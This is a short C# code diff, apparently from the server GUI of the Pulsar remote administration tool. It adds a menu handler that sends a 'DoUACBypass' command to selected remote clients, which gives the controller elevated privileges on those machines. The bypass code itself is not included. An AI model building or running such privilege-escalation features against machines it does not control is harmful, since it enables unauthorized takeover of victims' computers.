@@ -1072,6 +1072,14 @@ namespace Pulsar.Server.Forms
             }
         }
 
+        private void uACBypassToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoUACBypass());
+            }
+        }
+
         private void nicknameToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
